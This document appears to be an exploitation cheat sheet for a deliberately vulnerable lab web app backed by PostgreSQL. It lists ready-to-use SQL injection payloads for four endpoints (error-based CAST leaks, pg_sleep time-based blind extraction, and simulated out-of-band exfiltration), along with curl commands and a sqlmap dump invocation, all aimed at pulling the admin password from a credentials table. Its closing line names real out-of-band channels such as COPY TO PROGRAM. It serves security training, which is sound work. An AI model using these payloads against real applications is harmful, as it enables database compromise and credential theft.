Exploitation reference for security assessment. Database: app4_db.

VULN-13 Visible Error-Based SQL Injection

Endpoint: GET /search?name=<value>

Context: The name parameter is concatenated into a PostgreSQL ILIKE query. Errors (e.g. CAST failures) are rendered directly on the page.

# Confirm injection
' AND 1=1--           → results returned
' AND 1=2--           → no results

# Leak password via CAST error
' AND 1=CAST((SELECT password FROM credentials LIMIT 1) AS INTEGER)--

# Leak version
' AND 1=CAST(version() AS INTEGER)--

# cURL
curl "http://localhost:8084/search?name=%27+AND+1%3DCAST((SELECT+password+FROM+credentials+LIMIT+1)+AS+INTEGER)--"
VULN-14 Blind SQLi – Time Delays

Endpoint: GET /department?dept=<value>

Context: dept is injected into a WHERE clause. Response time (shown on page) acts as the oracle. Use pg_sleep to confirm injection.

# 5-second delay — injection confirmed
Engineering'||(SELECT pg_sleep(5))--
Engineering'; SELECT pg_sleep(5)--

# Conditional delay to confirm DB name
Engineering' AND (SELECT CASE WHEN (current_database()='app4_db') THEN pg_sleep(5) ELSE pg_sleep(0) END)=''--

# cURL
curl -w "\nTime: %{time_total}s\n" \
  "http://localhost:8084/department?dept=Engineering%27%7C%7C(SELECT+pg_sleep(5))--"
VULN-15 Blind SQLi – Time Delays + Data Retrieval

Endpoint: GET /employee?id=<value>

Context: id is injected into a numeric WHERE clause. Conditional pg_sleep reveals one bit per request; accumulate bits to extract secrets.

# Confirm injection (5s delay)
1; SELECT pg_sleep(5)--

# Extract admin password char by char
# TRUE → 5s delay | FALSE → no delay
1; SELECT CASE WHEN SUBSTRING(password,1,1)='S' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM credentials WHERE username='admin'--

# Automate
sqlmap -u "http://localhost:8084/employee?id=1" --technique=T --dbms=postgresql -p id --dump
VULN-16 Blind SQLi – OOB Interaction (Simulated)

Endpoint: POST /profile — field employee_id

Context: The oob_exfil() PostgreSQL function writes to oob_log. Results are visible at /oob-log, simulating a DNS/HTTP receive server.

# Exfiltrate admin password
employee_id = 1 OR 1=(SELECT oob_exfil((SELECT password FROM credentials WHERE username='admin'),'vuln16')::integer)

# Exfiltrate DB version
employee_id = 1; SELECT oob_exfil(version(),'vuln16')--

# cURL
curl -X POST http://localhost:8084/profile \
  -d "employee_id=1 OR 1=(SELECT oob_exfil((SELECT password FROM credentials WHERE username%3D'admin'),'v16')::integer)"

# View exfiltrated data
curl http://localhost:8084/oob-log

Real OOB would use dblink, COPY TO PROGRAM, or DNS via pg_read_file/pg_exec. Documented here for lab simulation only.

Tables: employees, departments, credentials(username,password,is_admin), oob_log  |  Target: credentials
